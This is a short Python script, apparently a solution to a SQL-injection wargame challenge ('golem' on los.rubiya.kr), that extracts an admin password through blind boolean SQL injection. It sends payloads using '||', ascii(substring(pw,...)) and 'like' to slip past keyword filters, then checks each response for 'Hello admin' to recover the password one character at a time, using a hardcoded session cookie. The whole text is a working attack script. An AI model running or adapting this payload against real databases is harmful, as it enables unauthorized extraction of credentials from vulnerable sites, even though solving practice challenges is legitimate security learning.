import requests


host = "https://los.rubiya.kr"
password=""
cookies = {"PHPSESSID": "7nn6qu3gqi6heere5euhieu8nb"}
for i in range(1,8):
    for j in range(33,126):
        pw_payload="?pw=1'|| ascii(substring(pw,"+str(i)+",1)) like "+str(j)+"-- "

        r = requests.get(host+"/chall/golem_4b5202cfedd8160e73124b5234235ef5.php" + pw_payload, cookies=cookies)

        if (r.text.find('Hello admin')>0):
            password+=chr(j)
            print(password)
            break

print(password)
